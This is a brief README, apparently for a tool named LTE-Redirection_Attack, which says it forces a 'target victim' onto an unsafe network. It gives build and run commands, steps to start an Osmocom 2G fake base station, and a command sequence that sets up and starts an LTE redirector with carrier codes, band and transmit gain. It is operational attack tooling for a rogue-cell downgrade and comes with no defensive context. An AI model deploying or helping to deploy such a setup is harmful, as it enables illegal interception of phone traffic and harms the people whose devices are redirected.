# LTE-Redirection_Attack
Force target victim to unsafe network

## Build

```bash
sudo ./build.sh
```


## Run

```bash
sudo ./run.sh
```

2G EGPRS Fake base Station :

In Osmocom Popped Terminal (change MCC//MNC accordingly in osmo-bsc.cfg osmo-bsc.cfg)

```bash
./osmo-all.sh start
```

LTE Node redirector

```bash
write mcc (replace)
write mnc (relace)
wirte tracking_area_code (replace)
write mcc (replace)
write mnc (replace)
write band (replace)
write dl_earfcn (replace)
write tx_gain 80
write rx_gain 30
start
``` 
